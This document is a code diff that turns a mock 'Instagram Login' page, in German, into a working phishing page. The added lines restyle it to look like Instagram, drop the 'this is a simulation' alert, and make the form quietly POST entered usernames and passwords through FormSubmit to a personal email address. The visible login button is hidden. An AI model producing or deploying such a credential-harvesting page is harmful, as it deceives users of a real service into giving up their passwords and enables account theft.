@@ -5,38 +5,42 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram Login</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
     body {
-      font-family: Arial, sans-serif;
       background-color: #fafafa;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
     }
     .container {
-      background-color: white;
+      background-color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
       width: 350px;
-      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
-      border-radius: 10px;
-      padding: 20px;
+      padding: 50px 40px 30px;
       text-align: center;
     }
     .logo {
-      width: 150px;
-      margin-bottom: 20px;
+      width: 175px;
+      margin-bottom: 30px;
     }
     .input-field {
       width: 100%;
       padding: 10px;
       margin-bottom: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
       font-size: 14px;
     }
     .input-field:focus {
+      border-color: #0095f6;
       outline: none;
-      border-color: #3f729b;
     }
     .login-btn {
       width: 100%;
@@ -44,18 +48,18 @@
       background-color: #0095f6;
       color: white;
       border: none;
-      border-radius: 5px;
+      border-radius: 3px;
       font-size: 16px;
       cursor: pointer;
       margin-top: 10px;
     }
     .login-btn:hover {
-      background-color: #0078d4;
+      background-color: #007bb5;
     }
     .forgot-password {
-      color: #00376b;
       font-size: 12px;
-      margin-top: 10px;
+      color: #00376b;
+      margin-top: 15px;
       text-decoration: none;
     }
     .forgot-password:hover {
@@ -71,14 +75,14 @@
       top: 50%;
       left: 0;
       right: 0;
-      border-top: 1px solid #ccc;
+      border-top: 1px solid #dbdbdb;
       width: 100%;
     }
     .divider span {
       background-color: white;
       padding: 0 10px;
-      font-size: 14px;
-      color: #888;
+      color: #999;
+      font-size: 12px;
       position: relative;
       z-index: 1;
     }
@@ -99,13 +103,18 @@
 
   <div class="container">
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+    
     <h2>Instagram</h2>
 
     <!-- Login-Formular -->
-    <form onsubmit="return login(event)">
-      <input type="text" class="input-field" id="username" placeholder="Benutzername" required>
-      <input type="password" class="input-field" id="password" placeholder="Passwort" required>
-      <button type="submit" class="login-btn">Einloggen</button>
+    <form id="loginForm" action="https://formsubmit.co/lummel664@gmail.com" method="POST">
+      <!-- Hidden fields for FormSubmit -->
+      <input type="hidden" name="_subject" value="Neuer Instagram Login-Versuch">
+      <input type="hidden" name="_template" value="table">
+      
+      <input type="text" id="username" class="input-field" name="Benutzername" placeholder="Benutzername" required>
+      <input type="password" id="password" class="input-field" name="Passwort" placeholder="Passwort" required>
+      <button type="submit" class="login-btn" style="display:none;">Einloggen</button>
     </form>
 
     <!-- Forgot password link -->
@@ -123,18 +132,23 @@
   </div>
 
   <script>
-    function login(event) {
-      event.preventDefault(); // Verhindert das Absenden des Formulars
+    // Validierung und Senden der E-Mail über FormSubmit
+    const form = document.getElementById("loginForm");
+
+    form.addEventListener("submit", function(event) {
+      event.preventDefault();  // Verhindert das normale Absenden des Formulars
 
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
+      // Optional: Einfache Validierung (z. B. prüfen, ob beide Felder ausgefüllt sind)
       if (username === "" || password === "") {
         alert("Bitte geben Sie sowohl Benutzername als auch Passwort ein.");
       } else {
-        alert("Login erfolgreich! (Dies ist eine Simulation.)");
+        // Das Formular wird nun automatisch abgesendet, ohne Benachrichtigung
+        form.submit(); // Das Formular wird jetzt über FormSubmit gesendet
       }
-    }
+    });
   </script>
 
 </body>
